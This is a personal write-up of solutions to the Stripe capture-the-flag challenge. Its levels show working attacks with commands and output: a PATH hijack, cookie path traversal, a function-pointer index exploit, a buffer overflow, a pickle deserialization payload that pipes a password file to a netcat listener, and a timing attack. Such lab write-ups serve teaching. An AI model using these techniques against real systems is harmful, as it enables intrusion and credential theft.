Stripe CTF
==========

https://stripe.com/blog/capture-the-flag

My solutions to the Stripe CTF solution are as follows.
Note that in many cases the code isn't very robust or workable. But was
the minimum needed to complete the level.

Level 01
--------

On observing that the system call within level01.c made an unchecked
call to 'date' without a full path specified I created a local date
file and set it to the local path. That file was simple shell script
containing 'cat /home/level02/.password'.

    level01@ctf:/tmp/tmp.8N0qqvoaVu$ export PATH=/tmp/tmp.8N0qqvoaVu:$PATH
    level01@ctf:/tmp/tmp.8N0qqvoaVu$ chmod a+x date
    level01@ctf:/tmp/tmp.8N0qqvoaVu$ /levels/level01
    Current time: kxlVXUvzv

Level 02
--------

Level 2 uses the contents of the clients cookie to read a file without
escaping the contents. Via a browser I modified the cookie set by the
level to the following and the password was printed as part of the web
page.

    Change cookie to ../../home/level03/.password
    Or0m4UX07b

Level 03
--------

I had never performed any sort of pointer arithmatic outside of an
introductory CS course. So this was certainly a challenge for me.
Outside of level 6 I think I spent more time on this level than any of
the other ones.

On reading level 3's source code I noticed that it was executing the
function via an array of function pointers. However the selection
mechanism used an argument which only checked for positive numbers >= 3
and not for number < 0.

After spending more time with it and gdb I realized you could select a negative
number which pointed to a specific location in the string buffer you
pass as an argument as well. After some fiddling I provided the memory
address of the deprected run function.

    level03@ctf4:/tmp/tmp.uuCAtV5Uog$ /levels/level03 -21 'cat /home/level04/.password;'$'\x5b'$'\x87'$'\x04'$'\x08'
    i5cBbPvPCpcP
    sh: [: not found

Level 04
--------

Like Level 03 I had never performed a buffer overflow before. I did some
searching and came across the following which amounts to a [buffer
overflows for dummies](http://biblio.l0t3k.net/b0f/en/BOFwithperl.txt). With some tweaking I was
able to make it work for the level 4 binary. It works about 50% of the
time. From what I understand Linux uses some sort of stack randomization
to prevent this sort of attack. From reading other reports online there
is a way to get a dterministic solution but I didn't take the time to
expore that.

    Offset:-994Address: 0xffa368fe
    Executing
    Buffer:57200
    Buffer:0
    $ 
    $ whoami
    level05
    $ cat /home/level05/.password
    fzfDGnSmd317

Level 05
--------

After looking at the python web server and running it locally. I noticed
that it wasn't properly escaping user input and allowed a file
containing executable code to be written to. I pickled up a simple
exploit, started a netcat server listening and passed it through.

    level05@ctf4:/tmp/tmp.7mKxYf6M1c$ nc -l 9333 &
    [1] 24599
    level05@ctf4:/tmp/tmp.7mKxYf6M1c$ 
    level05@ctf4:/tmp/tmp.7mKxYf6M1c$ curl localhost:9020 -d "DATA; job: cos
    system
    (S'nc localhost 9333 < /home/level06/.password'
    tR.'
    tR.
    "
    SF2w8qU1QDj
    {
        "result": "Job timed out"
    }
    [1]+  Done                    nc -l 9333

Level 06
--------

Of all the challenges this one
took the most time. I had heard of and felt I understood the
implementation of a timing attack but had no idea how hard it would be
to actually implement.

First I tried something written in ruby to test the time taken to run
the command, however I saw very little difference in how fast something
failed. Given that I was initially testing for the difference between 1
variable check and two and the precision of the ruby clock was only in
nanoseconds this failed right away.

Then I tried an [implementation](https://github.com/dividuum/stripe-ctf) that already existed online simply to
see if they could work given that many of the servers were under heavy
load and actively running out of forks. But even the supposed solution
above failed to work for me as it seems to depend on the binary forking
and reporting failure almost immediately which I wasn't even able to
replicate locally.

Finally I settled on passing very large arguments to slow down the
evaluation, similar to the solution above. Then timed each char read in
microseconds via a small c program. The fork operation takes slightly
longer to run than a normal character check and therefore with
microsecond precision you can determine where the failure occured.

This solution worked perfectly for me locally but I had to tune it on
stripe's servers in order to get it to work. I'm not sure if I was
reading the buffer incorrectly, the machine was overloaded or if my code
just runs in a way that I'm not expecting. Either way with some fine
tuning and extra sanity checks I was able to get it to run against the password file
and produce the answer.

    level06@ctf5:/tmp/tmp.2eCZvV2CuJ$ ruby ruby_wrapper.rb 
    Suffix: 130772
    {"t"=>4}
    Answer: t
    {"h"=>5}
    Answer: th
    {"e"=>5}
    Answer: the
    {"f"=>4}
    Answer: thef
    {"l"=>5}
    Answer: thefl
    {"a"=>5}
    Answer: thefla
    {"g"=>5}
    Answer: theflag
    {"l"=>5}
    Answer: theflagl
    {"0"=>4}
    Answer: theflagl0
    {"e"=>4}
    Answer: theflagl0e
    {"F"=>4}
    Answer: theflagl0eF
    {"T"=>5}
    Answer: theflagl0eFT
    {"t"=>5}
    Answer: theflagl0eFTt
    {"I"=>1, "T"=>5}
    Answer: theflagl0eFTtT
    {"5"=>5}
    Answer: theflagl0eFTtT5
    {"o"=>5}
    Answer: theflagl0eFTtT5o
    {"i"=>5}
    Answer: theflagl0eFTtT5oi
    {"0"=>4}
    Answer: theflagl0eFTtT5oi0
    {"n"=>5, "r"=>1}
    Answer: theflagl0eFTtT5oi0n
    {"O"=>5}
    Answer: theflagl0eFTtT5oi0nO
    {"T"=>5}
    Answer: theflagl0eFTtT5oi0nOT
    {"x"=>5, "e"=>1}
    Answer: theflagl0eFTtT5oi0nOTx
    {"O"=>5}
    Answer: theflagl0eFTtT5oi0nOTxO
    {"5"=>5}
    Answer: theflagl0eFTtT5oi0nOTxO5
    {}
    Answer: theflagl0eFTtT5oi0nOTxO5


    level06@ctf5:/tmp/tmp.2eCZvV2CuJ$ /levels/level06 /home/the-flag/.password theflagl0eFTtT5oi0nOTxO5
    Welcome to the password checker!
    ........................
    Wait, how did you know that the password was theflagl0eFTtT5oi0nOTxO5?

The Flag
--------

You're able to login as the flag user but I couldn't find anything
special or a secret next level. Perhaps I didn't look hard enough?

    the-flag@ctf5:/tmp/tmp.qCU4Sz2RhR$
